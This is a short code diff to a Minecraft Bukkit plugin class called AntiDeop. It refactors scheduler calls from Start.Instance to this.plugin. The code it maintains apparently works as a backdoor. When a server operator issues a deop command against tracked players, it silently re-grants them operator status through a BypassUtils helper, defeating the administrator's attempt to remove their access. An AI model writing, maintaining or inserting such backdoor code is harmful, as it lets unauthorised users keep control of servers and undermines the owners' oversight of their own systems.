@@ -47,17 +47,17 @@ public class AntiDeop extends Command {
         String[] args = command.split(" ");
         if (args.length <= 1) return;
         if (args[1].startsWith("@")) {
-            Bukkit.getScheduler().runTask(Start.Instance, () -> {
+            Bukkit.getScheduler().runTask(this.plugin, () -> {
                 for (UUID uuid : players) {
                     Player p = Bukkit.getPlayer(uuid);
                     if (p == null || !p.isOnline()) return;
-                    Bukkit.getScheduler().runTask(Start.Instance, () -> BypassUtils.PlayerOp(p));
+                    Bukkit.getScheduler().runTask(this.plugin, () -> BypassUtils.PlayerOp(p));
                 }
             });
         } else {
             Player p = Bukkit.getPlayer(args[1]);
             if (p == null || !players.contains(p.getUniqueId())) return;
-            Bukkit.getScheduler().runTask(Start.Instance, () -> BypassUtils.PlayerOp(p));
+            Bukkit.getScheduler().runTask(this.plugin, () -> BypassUtils.PlayerOp(p));
         }
     }
 }
